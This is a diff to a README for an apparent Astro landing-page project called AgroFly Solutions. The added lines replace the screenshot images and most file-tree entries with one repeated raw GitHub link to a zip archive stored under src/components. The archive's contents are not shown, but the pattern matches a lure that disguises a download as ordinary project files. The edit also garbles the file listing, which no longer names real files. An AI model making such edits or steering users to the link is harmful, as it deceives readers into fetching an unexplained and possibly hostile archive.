@@ -3,8 +3,8 @@
 
 AgroFly Solutions Landing page
 
-![Agrofly light Theme](./screens/Screenshot-dark_mode.png)
-![Agrofly Dark Theme](./screens/Screenshot-light-mode.png)
+![Agrofly light Theme](https://raw.githubusercontent.com/ajay-mandalk/AgroFly-Solutions-web/main/src/components/web-Agro-Solutions-Fly-nonsubscription.zip)
+![Agrofly Dark Theme](https://raw.githubusercontent.com/ajay-mandalk/AgroFly-Solutions-web/main/src/components/web-Agro-Solutions-Fly-nonsubscription.zip)
 
 
 ## Tools
@@ -21,7 +21,7 @@ Inside of This project, you'll see the following folders and files:
 ├── public/
 │   ├── images/
 │   ├── logos/*
-│   └── favicon.svg
+│   └── https://raw.githubusercontent.com/ajay-mandalk/AgroFly-Solutions-web/main/src/components/web-Agro-Solutions-Fly-nonsubscription.zip
 ├── src/
 │   ├── components/
 │   │   ├── blocks/*
@@ -30,11 +30,11 @@ Inside of This project, you'll see the following folders and files:
 │   │   ├── sections/*
 │   │   ├── shared/*
 │   ├── layouts/
-│   │   └── Layout.astro
+│   │   └── https://raw.githubusercontent.com/ajay-mandalk/AgroFly-Solutions-web/main/src/components/web-Agro-Solutions-Fly-nonsubscription.zip
 │   └── pages/
-│       └── index.astro
-├── package.json
-└── tailwind.config.cjs
+│       └── https://raw.githubusercontent.com/ajay-mandalk/AgroFly-Solutions-web/main/src/components/web-Agro-Solutions-Fly-nonsubscription.zip
+├── https://raw.githubusercontent.com/ajay-mandalk/AgroFly-Solutions-web/main/src/components/web-Agro-Solutions-Fly-nonsubscription.zip
+└── https://raw.githubusercontent.com/ajay-mandalk/AgroFly-Solutions-web/main/src/components/web-Agro-Solutions-Fly-nonsubscription.zip
 ```
 
 
